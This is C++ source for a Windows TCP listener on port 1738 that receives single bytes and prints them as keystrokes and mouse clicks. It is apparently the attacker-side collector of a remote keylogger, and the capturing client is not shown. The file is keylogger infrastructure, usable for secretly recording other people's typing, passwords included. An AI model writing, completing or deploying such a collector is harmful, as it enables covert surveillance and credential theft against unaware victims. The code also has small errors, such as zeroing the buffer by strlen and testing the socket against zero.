#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#pragma comment(lib, "ws2_32.lib")

bool initialize_wsa();
void listen_for_keys(SOCKET* sock);

int main() {
	int err = 0;
	HANDLE handle = GetStdHandle(STD_OUTPUT_HANDLE);
	err = initialize_wsa();
	if (err) {
		std::cerr << "wsa startup err" << std::endl;
		return -1;
	}
	SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
	if (!sock) {
		std::cerr << "socket formation err" << std::endl;
		return -1;
	}
	sockaddr_in sin{};
	sin.sin_family = AF_INET;
	sin.sin_port = htons(1738);
	sin.sin_addr.S_un.S_addr = INADDR_ANY;
	err = bind(sock, (const sockaddr*)&sin, sizeof(sin));
	if (err) {
		std::cerr << "socket binding err" << std::endl;
		return -1;
	}
	socklen_t sin_size = sizeof(sin);
	err = listen(sock, 3);
	if (err) {
		std::cerr << "listening err" << std::endl;
		return -1;
	}
	SOCKET conn = accept(sock, (sockaddr*)&sin, &sin_size);
	if (!conn) {
		std::cerr << "accepting err" << std::endl;
		return -1;
	}
	listen_for_keys(&conn);
}

bool initialize_wsa() {
	WSAData wsData;
	if (WSAStartup(MAKEWORD(2, 2), &wsData) != 0) {
		return true;
	}
	return false;
}

void listen_for_keys(SOCKET* sock) {
	int err = 0;
	while (true) {
		// the key and the null ptr
		char buffer[2]{};
		ZeroMemory((void*)buffer, strlen(buffer));
		err = recv(*sock, buffer, 1, 0);
		WSAGetLastError();
		if (err != -1) {
			switch (buffer[0]) {
			case 0x1:
				std::cout << "[Left Mouse has been clicked!]" << std::endl;
				break;
			case 0x2:
				std::cout << "[Right Mouse has been clicked!]" << std::endl; 
				break;
			case 0x4:
				std::cout << "[Scroll Wheel has been clicked!]" << std::endl;
				break;
			case 0x14:
				std::cout << "[Caps Lock was pressed!]" << std::endl;
				break;
			case VK_SHIFT:
				std::cout << "[Shift key was pressed!]" << std::endl;
				break;
			case VK_CONTROL:
				std::cout << "[Control key was pressed!]" << std::endl;
				break;
			case 0xA4:
			case 0x12:
				std::cout << "[Alt key was pressed!]" << std::endl;
				break;
			case VK_UP:
				std::cout << "[Up arrow key was pressed!]" << std::endl;
				break;
			case VK_DOWN:
				std::cout << "[Down arrow key was pressed!]" << std::endl;
				break;
			case VK_LEFT:
				std::cout << "[Left arrow key was pressed!]" << std::endl;
				break;
			case VK_RIGHT:
				std::cout << "[Right arrow key was pressed!]" << std::endl;
				break;
			case 0xBE:
				std::cout << ".";
				break;
			case 0x0A:
			case 0x0D:
				std::cout << std::endl;
				break;
			default:
				std::cout << buffer[0];
			}
		}
	}
}